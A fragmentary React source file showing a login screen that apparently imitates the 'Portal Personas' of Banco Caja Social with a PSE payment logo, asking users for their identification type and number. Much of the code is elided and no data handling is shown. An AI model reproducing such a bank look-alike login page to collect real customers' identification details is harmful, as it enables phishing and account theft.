...
const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    ...
    const handlerContinuar = () => {
        ...
        if (datosInicio.numeroDocumento ) {
    ...
    return (
        <div className="w-full flex flex-col justify-center items-center pb-4">
            <h5 className="text-[30px] text-[#00253d] font-bold mt-10">Bienvenido al Portal Personas</h5>
            <span className="text-[13px] text-[#7c8e9b] mt-4">Recuerde que su usuario está compuesto por su Tipo de Identificación <span className="font-bold">(CC, CE, NI, TI, PE) </span> y su Número de Identificación sin espacios, puntos ni comas.</span>
...
export default function CajaSocial (){
    ...
    return(
        <div className={`w-full flex flex-col items-center justify-center ${back_color}`}>
            <div className={`w-full flex justify-center items-center py-3`}>
                <div className={`w-[80%] flex gap gap-x-10`}>
                    
                    <img src="/assets/cajaSocial/cajaHeader.svg" className="w-[65%] object-contain"/>
                    
                    <img src="/assets/cajaSocial/pse-logo.svg" className="w-[15%] object-contain"/>

                </div>

            </div>
            
            <div className=" min-h-[70vh] w-[75%] mt-2 flex flex-col items-center justify-center">
